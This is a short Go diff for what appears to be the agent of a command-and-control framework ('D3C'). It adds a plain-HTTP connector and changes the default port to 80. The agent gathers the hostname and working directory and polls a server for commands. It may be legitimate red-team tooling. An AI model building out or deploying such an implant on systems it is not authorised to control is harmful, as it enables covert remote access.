@@ -39,8 +39,8 @@ func init() {
 	// permite configurar via variáveis de ambiente:
 	// D3C_SERVIDOR, D3C_PORTA, D3C_CONEXAO
 	SERVIDOR = getenvOr("D3C_SERVIDOR", "127.0.0.1")
-	PORTA = getenvOr("D3C_PORTA", "8443")
-	CONEXAO = getenvOr("D3C_CONEXAO", "https")
+	PORTA = getenvOr("D3C_PORTA", "80")
+	CONEXAO = getenvOr("D3C_CONEXAO", "http")
 
 	mensagem.AgentHostname, _ = os.Hostname()
 	mensagem.AgentCWD, _ = os.Getwd()
@@ -57,6 +57,9 @@ func main() {
 		case "https":
 			httpsConnector := connectors.HttpsConnector{}
 			httpsConnector.Execute(SERVIDOR, PORTA, &mensagem)
+		case "http":
+			httpConnector := connectors.HttpConnector{}
+			httpConnector.Execute(SERVIDOR, PORTA, &mensagem)
 		}
 
 		if len(mensagem.Comandos) > 0 {
